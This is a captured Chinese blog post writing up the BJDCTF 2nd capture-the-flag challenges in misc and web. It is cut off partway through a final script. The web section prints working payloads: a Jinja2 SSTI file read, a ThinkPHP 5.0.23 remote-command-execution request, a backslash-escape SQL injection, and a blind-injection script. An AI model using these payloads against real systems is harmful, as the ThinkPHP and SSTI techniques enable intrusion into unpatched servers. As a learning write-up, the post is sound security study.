@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="writeup,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这次比赛做了misc和web，比赛还是比较入门的，特别是misc，我都能做（ 复盘一下。 MISC1.最简单的miscsecret.zip压缩包是伪加密，改了以后就能解开了，里面有一个secret文件，看了一下，是头部不完整的png，修复以后是这样   上面的神秘字串是hex编码，转换一下就是flag了。 2.A_Beautiful_Picture改高度getflag. 3.小姐姐直接winhex">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF 2nd WriteUp">
+<meta property="og:url" content="https://dopaminer.github.io/2020/03/27/BJDCTF 2nd WriteUp/index.html">
+<meta property="og:site_name" content="Dopamine&#39;s Blog">
+<meta property="og:description" content="这次比赛做了misc和web，比赛还是比较入门的，特别是misc，我都能做（ 复盘一下。 MISC1.最简单的miscsecret.zip压缩包是伪加密，改了以后就能解开了，里面有一个secret文件，看了一下，是头部不完整的png，修复以后是这样   上面的神秘字串是hex编码，转换一下就是flag了。 2.A_Beautiful_Picture改高度getflag. 3.小姐姐直接winhex">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200322220450.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200323192340.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200323192824.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200323235502.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324000348.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324223923.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324224002.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324224027.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324224409.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324231806.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325095539.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325095953.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325100439.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325141408.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325153658.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325154907.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325230801.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325230825.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325230319.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325221449.png">
+<meta property="og:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200326094058.png">
+<meta property="og:updated_time" content="2020-03-27T03:22:33.431Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BJDCTF 2nd WriteUp">
+<meta name="twitter:description" content="这次比赛做了misc和web，比赛还是比较入门的，特别是misc，我都能做（ 复盘一下。 MISC1.最简单的miscsecret.zip压缩包是伪加密，改了以后就能解开了，里面有一个secret文件，看了一下，是头部不完整的png，修复以后是这样   上面的神秘字串是hex编码，转换一下就是flag了。 2.A_Beautiful_Picture改高度getflag. 3.小姐姐直接winhex">
+<meta name="twitter:image" content="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200322220450.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://dopaminer.github.io/2020/03/27/BJDCTF 2nd WriteUp/">
+
+
+
+
+
+  <title>BJDCTF 2nd WriteUp | Dopamine's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Dopamine's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://dopaminer.github.io/2020/03/27/BJDCTF 2nd WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D0pamine">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/头像.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dopamine's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BJDCTF 2nd WriteUp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-27T11:22:33+08:00">
+                2020-03-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这次比赛做了misc和web，比赛还是比较入门的，特别是misc，我都能做（</p>
+<p>复盘一下。</p>
+<h4 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h4><h5 id="1-最简单的misc"><a href="#1-最简单的misc" class="headerlink" title="1.最简单的misc"></a>1.最简单的misc</h5><p>secret.zip压缩包是伪加密，改了以后就能解开了，里面有一个secret文件，看了一下，是头部不完整的png，修复以后是这样</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200322220450.png" style="zoom:50%;">
+
+<p>上面的神秘字串是hex编码，转换一下就是flag了。</p>
+<h5 id="2-A-Beautiful-Picture"><a href="#2-A-Beautiful-Picture" class="headerlink" title="2.A_Beautiful_Picture"></a>2.A_Beautiful_Picture</h5><p>改高度getflag.</p>
+<h5 id="3-小姐姐"><a href="#3-小姐姐" class="headerlink" title="3.小姐姐"></a>3.小姐姐</h5><p>直接winhex搜BJD，或者linux用strings命令都能得到flag。</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200323192340.png" alt></p>
+<h5 id="4-Real-EasyBaBa"><a href="#4-Real-EasyBaBa" class="headerlink" title="4.Real_EasyBaBa"></a>4.Real_EasyBaBa</h5><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200323192824.png" style="zoom:50%;">
+
+<p>这尼玛的是画出来的flag，太抽象了，比赛的时候真的没看出来，我裂开。</p>
+<p>BJD{572154976}</p>
+<h5 id="5-EasyBaBa"><a href="#5-EasyBaBa" class="headerlink" title="5.EasyBaBa"></a>5.EasyBaBa</h5><p>看这个文件这么大，估计是个图种，foremost一分析，果然提取出来一个压缩包，然后解压发现里面是一个jpg，但是winhex打开以后发现是avi文件，改后缀potplayer打开，是可怜的钉钉。一闪而过很多图片，好像隐约看到了二维码。potplayer<code>shift+ctrl+左右方向键</code>可以逐帧看。</p>
+<p>分别给了几张二维码，都是反色过的，调亿下就好了，其实我是找了ps大佬帮我调清晰了，不然扫不出来。</p>
+<p>总而言之整合过后得到的：agin_love_YBJD{imlng}</p>
+<p>栅栏？试了一遍好像都不是flag，看wp说是伪栅栏，我裂开。不过长这样也挺好猜出来的。</p>
+<p>flag：BJD{imagin_love_Y1ng}</p>
+<h5 id="6-圣火昭昭"><a href="#6-圣火昭昭" class="headerlink" title="6.圣火昭昭"></a>6.圣火昭昭</h5><p>hint：开局一张图，flag全靠猜，猜还被加粗了，合理猜测是outguess隐写。</p>
+<p>加解密是要有key的，如何获得key呢？在windows里面右键查看图片属性可以看到，备注里面有新佛曰。在<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新佛曰的在线解密网站</a>可以解得gemlove，应该就是key了。</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200323235502.png" style="zoom: 67%;">
+
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324000348.png" alt></p>
+<h5 id="7-开场曲"><a href="#7-开场曲" class="headerlink" title="7.开场曲"></a>7.开场曲</h5><p>mp4文件，好一个听声辨位题，这个网站键盘每个键对应不同的音，显示的图标也一般不同，可能是敲出的flag，猜测开头的是<code>BJD{</code>，然后看了一下真的是，好像是每个音敲了两遍。然后就听出来就行了，听得我都快自闭了。</p>
+<p>BJD{MIKUTAP3313313}</p>
+<h5 id="8-TARGZ"><a href="#8-TARGZ" class="headerlink" title="8.TARGZ"></a>8.TARGZ</h5><p>提示解压密码不需要爆破。看文件头这好像是个zip文件，不过后缀是tar.gz，也不是伪加密，也说不需要爆破密码，很迷茫。后来放了hint，提示文件名就是解压密码…好吧。解压缩了几个，发现是个压缩包套娃题，用脚本吧。</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	aa=os.popen(<span class="string">'ls'</span>)</span><br><span class="line">	filename=aa.read().replace(<span class="string">"a.py"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">	a=filename.replace(<span class="string">".tar.gz"</span>,<span class="string">""</span>)</span><br><span class="line">	kind=filetype.guess(filename)</span><br><span class="line">	<span class="keyword">if</span> kind.extension <span class="keyword">is</span> <span class="string">"zip"</span>:</span><br><span class="line">		os.system(<span class="string">'mv &#123;&#125; &#123;&#125;.zip|unzip -P &#123;&#125; &#123;&#125;.zip'</span>.format(filename,a,a,a))</span><br><span class="line">		os.system(<span class="string">"rm *.zip"</span>)</span><br><span class="line">		time.sleep(<span class="number">0.1</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">"finished."</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>最后解压了三百次左右吧，出了flag。</p>
+<p>BJD{wow_you_can_rea11y_dance}</p>
+<h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h5 id="1-fake-google"><a href="#1-fake-google" class="headerlink" title="1.fake google"></a>1.fake google</h5><p>SSTI</p>
+<p>测试发现可以任意执行命令任意读文件。</p>
+<p>payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'/flag'</span>, <span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-old-hack"><a href="#2-old-hack" class="headerlink" title="2. old-hack"></a>2. old-hack</h5><p>这个界面就很复古。然后发现没有什么可以交互的，但是提示是thinkphp5的框架，应该就是框架漏洞了吧。</p>
+<p>说起来很早以前就想看一下tp5的开发手册了，但是拖延了，哽咽。最近尽快安排上，挖个坑。</p>
+<p>TP框架有s参数可以加载模块，随便输入一个s=1，应该是debug模式，能看到报错信息，发现是TP5.0.23版本。</p>
+<p>用的是TP5.0.23远程RCE的CVE，直接上CVE的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?s=captcha</span><br><span class="line">POST _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-简单注入"><a href="#3-简单注入" class="headerlink" title="3.简单注入"></a>3.简单注入</h5><p>这题最初看到过滤了单引号和双引号，有点麻爪，然后fuzz了一下</p>
+<p>1414是过滤的</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324223923.png" alt></p>
+<p>2609是可用的</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324224002.png" alt></p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324224027.png" alt></p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324224409.png" alt></p>
+<p>union，select，like，=，都被ban了。</p>
+<p>有一件值得反思的很气的事情，我在比赛途中google到了这题的思路，是有人在发问是否过滤了单双引号就可以百分百防止sql注入，评论有个大哥提到了可以用反斜杠转义单引号达到sql语句逃逸的效果，但是我当时看到这题解出的人数很少，觉得不是我的level的题目，就弃了这个思路，去看别的题了，哽咽。</p>
+<p>这件事情告诉我们什么道理，人一定要自信自强，才能成功（</p>
+<p>这题因为没有过滤反斜杠，所以可以利用反斜杠来转移单引号，假设后台查询语句是这样的：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">where</span> username=<span class="string">'参数'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'参数'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们输入username=admin\ password=or 1#</p>
+<p>后台就是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">where</span> username=<span class="string">'admin\' or password='</span><span class="keyword">or</span> <span class="number">1</span><span class="comment">#';</span></span><br></pre></td></tr></table></figure>
+
+<p>就可以实现sql语句逃逸了。测试了一下这个payload，发现确实可以用，回显变了，说明是布尔注入。</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200324231806.png" alt></p>
+<p>既然select也过滤了，也不能堆叠注入，所以我暂时没有别的思路了，猜测是不需要用到select的，那就是注出password然后登陆得到密码吧。过滤了等于号和like，这里可以用regexp正则匹配来注出password。但是regexp匹配在3.23.4版本后是不分大小写的，这样很容易注出错误的答案，所以要用binary来判断。</p>
+<p>自己写的是时间盲注，有点慢，这里贴一下y1ng师傅的脚本，我觉得挺好的。</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">################################</span></span><br><span class="line"><span class="comment"># 颖奇L'Amore www.gem-love.com #</span></span><br><span class="line"><span class="comment"># 转载请勿删除本水印             #</span></span><br><span class="line"><span class="comment">################################</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span><span class="params">(string)</span>:</span></span><br><span class="line">  result = <span class="string">''</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">    result += hex(ord(i))</span><br><span class="line">  result = result.replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'0x'</span>+result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://123.57.144.205:2333/"</span></span><br><span class="line">string = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>]</span><br><span class="line">headers = &#123;</span><br><span class="line">      <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0'</span>,</span><br><span class="line">      <span class="string">'Accept'</span>:<span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">      <span class="string">'Connection'</span>:<span class="string">'keep-alive'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">    passwd = ord2hex(<span class="string">'^'</span>+res+chr(j))</span><br><span class="line">    <span class="comment"># print(passwd)</span></span><br><span class="line">    passwd = <span class="string">'or password regexp binary &#123;&#125;#'</span>.format(passwd)</span><br><span class="line">    data = &#123;</span><br><span class="line">      <span class="string">'username'</span>:<span class="string">"admin\\"</span>,</span><br><span class="line">      <span class="string">'password'</span>:passwd</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = req.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"BJD need"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">      res += chr(j)</span><br><span class="line">      print(res)</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>跑出密码，登陆得到flag。</p>
+<p>（话说后来才发现这题是有hint的）</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325095539.png" alt></p>
+<h5 id="4-假猪套天下第一"><a href="#4-假猪套天下第一" class="headerlink" title="4.假猪套天下第一"></a>4.假猪套天下第一</h5><p>这题主要考察对HTTP Header的了解。</p>
+<p>开始是个登陆页面，可以随便登陆，但好像没什么东西，估计是用来迷惑的。</p>
+<p>登陆界面抓包可以看到有个hint(但是我不太懂为什么不抓包在浏览器界面就看不到hint)</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325095953.png" alt></p>
+<p>访问<code>L0g1n.php</code>，显示<code>Sorry, this site will be available after totally 99 years!</code></p>
+<p>发现cookie处有个时间戳，应该是改时间戳到99年以后就可以访问了</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325100439.png" alt></p>
+<p>我直接在后面添了两个0，然后就跳到了下一个要求：<code>Sorry, this site is only optimized for those who comes from localhost</code></p>
+<p>尝试了一下XFF，发现被ban了，但是还可以添加Client-IP: 127.0.0.1或者是X-Real-IP: 127.0.0.1。</p>
+<p>下一个：<code>Sorry, this site is only optimized for those who come from gem-love.com</code></p>
+<p>添加<code>Referer: gem-love.com</code></p>
+<p>下一个：<code>Sorry, this site is only optimized for browsers that run on Commodo 64</code></p>
+<p>然后google了半天，不知道commodo 64是个什么东西，倒是有commodore 64，是一种老式8位电脑系统。把UA改成这个试了一下，过了。</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325141408.png" alt></p>
+<p>这个email用<code>From: root@gem-love.com</code>头。</p>
+<p>然后：</p>
+<p>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip </p>
+<p>if you dont have the proxy, pls contact us to buy, ￥100/Month</p>
+<p>太狠了，还要给钱。</p>
+<p>添加<code>Via: y1ng.vip</code></p>
+<p>然后就给了flag的base64，解码即可。</p>
+<p>这题还是挺好玩的，有些生僻的Header，我都是参考这篇<a href="https://www.cnblogs.com/jxl1996/p/10245958.html" target="_blank" rel="noopener">文章</a>的。</p>
+<h5 id="5-Schrödinger"><a href="#5-Schrödinger" class="headerlink" title="5.Schrödinger"></a>5.Schrödinger</h5><p>标题好像是薛定谔？看了一下内容，大概意思就是说你可以提交一个可以爆破密码的网页，然后他帮你爆破，会给一个成功率，成功率足够大的时候check就能得到密码，如果不行check后就爆破失效。</p>
+<p>然后看源码，发现有一行白色的字：</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325153658.png" alt></p>
+<p>点进去test.php，是一个登陆界面，说<code>I left some good for you in my admin passwd.</code></p>
+<p>应该就是要爆出密码的意思呗，然后正好主页面帮我们爆破密码，那就把这个页面拉过去吧。</p>
+<p>但是发现成功率上升得很慢，而且越来越慢…这样等下去估计是不科学了，抓包一探究竟。</p>
+<p>抓包发现，cookie里面有个base64过的东西</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325154907.png" alt></p>
+<p>解码之后发现好像是时间戳？随便改了一下发现还真的和成功率有关。感觉那个数字滚动效果可能是js做的，然后又去看了<code>jQuery.js</code>源码，然后发现了时间和成功率真的有关系。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">script</span>(<span class="params">sub</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> rate = sub;</span><br><span class="line">	<span class="keyword">var</span> t = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		rate += <span class="number">1</span>;</span><br><span class="line">		span4.innerText = <span class="built_in">Math</span>.log(rate) * <span class="number">4.7</span>;</span><br><span class="line">	&#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>改大好像不明显，但是如果把时间戳改小，发现成功率上升了，而且后台的script参数的值也变大了</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325230801.png" alt></p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325230825.png" alt></p>
+<p>所以直接改成0的base64试试，然后发现成功率变成99％了，牛啤，然后check了一下，拿到了密码。</p>
+<img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325230319.png" style="zoom:67%;">
+
+<p>对了，这里要cookie和<code>?check=</code>这个参数一起改完以后forward回去。  </p>
+<p>这个密码，貌似是b站的av号，然后去评论区翻到了flag…</p>
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200325221449.png" alt></p>
+<p>如听仙乐耳暂明。</p>
+<h5 id="6-elementmaster"><a href="#6-elementmaster" class="headerlink" title="6.elementmaster"></a>6.elementmaster</h5><p>脑洞题。一打开又是一堆嘤语，然后瞄了一眼源代码，发现有hiden</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">hidden</span> <span class="attr">id</span>=<span class="string">"506F2E"</span>&gt;</span>I am the real Element Masterrr!!!!!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">hidden</span> <span class="attr">id</span>=<span class="string">"706870"</span>&gt;</span>@颖奇L'Amore<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>id都是hex，解出来是<code>Po.php</code>，里面只有一个点。</p>
+<p>然后联想到他这个界面，下面的小人说自己是118种元素之王，作者说他是门捷列夫，还画了俄罗斯国旗…这一层意思还真没get到hhh</p>
+<p>但是Po，118种元素，还是能理解到化学元素的，猜想了一下，可能不止<code>Po.php</code>，也许是每种元素的名字作为php名字，然后最后拼接出一个内容的。手动试了一下<code>Fe.php</code>，<code>Cu.php</code>，<code>Au.php</code>，前两个都是404，还以为我猜错了，还好<code>Au.php</code>里有点内容，验证了我的猜想。</p>
+<p>一个一个手工测试太麻烦，可以用py脚本跑一下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://4bc99a63-d7c8-445d-a9c2-7b1c639881a4.node3.buuoj.cn/"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">elements = [<span class="string">'H'</span>, <span class="string">'He'</span>, <span class="string">'Li'</span>, <span class="string">'Be'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'F'</span>, <span class="string">'Ne'</span>, <span class="string">'Na'</span>, <span class="string">'Mg'</span>, <span 